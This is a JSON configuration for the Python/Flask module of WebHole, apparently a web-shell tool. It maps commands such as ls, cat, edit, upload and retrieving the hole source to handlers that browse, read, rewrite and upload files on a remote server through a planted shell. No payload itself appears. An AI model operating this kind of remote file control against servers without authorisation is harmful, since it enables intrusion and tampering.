{
    "package-name": "python-flask",
    "command-0": "print('webhole-python-flask-by-yasserbdj96-:)')",
    "command-0-output": "webhole-python-flask-by-yasserbdj96-:)",
    "auto-call":{
        "DIRECTORY_SEPARATOR": "import os; print(repr(os.sep)[1:-1])",
        "SCRIPT_FILENAME":"import os;print(os.path.dirname(os.path.abspath(__file__)))",
        "file_content":"",
        "error_emoji": "\u274c",
        "success_emoji": "\u2705",
        "warning_emoji": "\u26a0"
    },
    "start": "",
    "end": "",
    "commands": {
        "ls": {
            "command-file": "ls.py",
            "command-arguments": {"path":"__path__"},
            "command-function": {"function":"fn_listsort","path":"{self.packages}.__functions__.fn_listsort"},
            "command-description": "List the contents of a directory",
            "action": {
                "type": "function",
                "handler": "con.connect(cli='ls', path=pwd, **c_params)"
            },
            "parameters": {},
            "output": true,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        },
        "tree": {
            "command-file": "tree.py",
            "command-arguments": {"path":"__path__"},
            "command-description": "Display the directory structure in a tree view",
             "action": {
                "type": "function",
                "handler": "con.connect(cli='tree', path=pwd, **c_params)"
            },
            "parameters": {},
            "output": true,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        },
        "tree -f": {
            "command-file": "tree_f.py",
            "command-arguments": {"path":"__path__"},
            "command-function": {"function":"fn_listsort","path":"{self.packages}.__functions__.fn_listsort"},
            "command-description": "Display the directory structure in a tree view with full file paths",
            "action": {
                "type": "function",
                "handler": "con.connect(cli='tree -f', path=pwd, cf=False, **c_params)"
            },
            "parameters": {},
            "output": true,
            "post_execute": false,
            "return_list": true,
            "with_function": false
        },
        "cd": {
            "command-file": "cd.py",
            "command-arguments": {"path":"__path__"},
            "command-return":"SCRIPT_FILENAME",
            "command-default": {"old_path":"{self.SCRIPT_FILENAME}"},
            "command-description": "Change the current working directory",
            "action": {
                "type": "function",
                "handler": "con.connect(cli='cd', path=cmd_parts, **c_params)"
            },
            "parameters": {},
            "output": false,
            "post_execute": "pwd",
            "return_list": false,
            "with_function": false
        },
        "cat":{
            "command-file": "cat.py",
            "command-arguments": {"path":"__path__"},
            "command-return":"{self.file_content}",
            "command-default": {"old_path":"{self.SCRIPT_FILENAME}"},
            "command-description": "Display the contents of a file",
            "action": {
                "type": "function",
                "handler": "con.connect(cli='cat', path=cmd_parts, **c_params)"
            },
            "parameters": {},
            "output": true,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        },
        "edit":{
            "command-file": "edit.py",
            "command-arguments": {"path":"__path__","new_b64_text":"__new_b64_text__"},
            "command-default": {"old_path":"{self.SCRIPT_FILENAME}"},
            "command-description": "Open and edit a file",
             "action": {
                "type": "function",
                "handler": "con.connect(cli='edit', path=pwd.strip()+con.DIRECTORY_SEPARATOR.strip()+cmd_parts.strip(), new_b64_text=base64.b64encode(con.editor(con.connect(cli='cat', path=cmd_parts, **c_params)).encode('utf-8')).decode('utf-8'))"
            },
            "parameters": {},
            "output": true,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        },
        "up":{
            "command-file": "up.py",
            "command-arguments": {"file":"__file__","path":"__path__","new_name":"__new_name__","data":"__data__"},
            "command-default": {"old_path":"{self.SCRIPT_FILENAME}"},
            "command-description": "up a file",
             "action": {
                "type": "function",
                "handler": "con.connect(cli='up', data=base64.b64encode(open(cmd_parts, 'rb').read()).decode('utf-8') ,file=cmd_parts, path=pwd, new_name=other_parts[0])"
            },
            "parameters": {},
            "output": true,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        },
        "-v": {
            "command-description": "Show the current version and package details",
            "action": {
                "type": "function",
                "handler": "con.info('__version__','__source__','__package_version__','__package_source__','__author__')"
            },
            "parameters": {},
            "output": true,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        },
        "-h": {
            "command-description": "Show available commands and usage information",
            "action": {
                "type": "function",
                "handler": "con.help('pkg')"
            },
            "parameters": {},
            "output": true,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        },
        "-hole": {
            "command-description": "Retrieve the WebHole source code",
            "action": {
                "type": "function",
                "handler": "con.hole(pkg=cmd_parts,nkey=NKEY)"
            },
            "parameters": {},
            "output": true,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        },
        "-pkgs": {
            "command-description": "List all installed packages",
            "action": {
                "type": "function",
                "handler": "con.pkgs()"
            },
            "parameters": {},
            "output": true,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        },
        "cls": {
            "command-description": "Clear the terminal screen",
            "action": {
                "type": "function",
                "handler": "os.system('cls' if os.name=='nt' else 'clear')"
            },
            "parameters": {},
            "output": false,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        },
        "exit": {
            "command-description": "Exit the application",
            "action": {
                "type": "function",
                "handler": "(lambda: (print('Exiting WebHole...'), exit()))()"
            },
            "parameters": {},
            "output": false,
            "post_execute": false,
            "return_list": false,
            "with_function": false
        }
    },
    "values": {
        "pwd": {
            "value-get":"{self.SCRIPT_FILENAME}"
        },
        "package_name": {
            "value-get":"{self.package_name}"
        },
        "package_version": "0.0.2-beta",
        "author":"Author : YasserBdj96\nEmail  : yasserbdj96@gmail.com",
        "package_source":"https://github.com/yasserbdj96/WebHole/tree/main/webhole/packages/python-flask"
    },
    "hole-code":"hole.py",
    "logo": [
            "",
            "    ██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗ ██╗     ███████╗",
            "    ██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██║     ██╔════╝",
            "    ██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║     █████╗  ",
            "    ██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║     ██╔══╝  ",
            "    ╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝███████╗███████╗",
            "     ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝",
            "",
            "    ⚡ WebHole -  P Y T H O N   •   F L A S K  (v__package_version__) ⚡",
            "",
            "   +────────────────────────────────────────────────────────────+",
            "      🛠️ Coded by: __author__ ",
            "      🌐 Website : https://yasserbdj96.github.io/ ",
            "      📂 Source  : __source__ ",
            "      📦 Build   : __version__ ",
            "      💰 USDT    : __usdt__ ",
            "      💰 BTC     : __btc__ ",
            "   +────────────────────────────────────────────────────────────+",
            ""
        ],
    "logo_color": {
        "█": "c_green",
        "═": "c_yellow",
        "╚": "c_yellow",
        "╝": "c_yellow",
        "╗": "c_yellow",
        "╔": "c_yellow",
        "║": "c_yellow",
        "─": "c_yellow",
        "+": "c_yellow"

    }
}
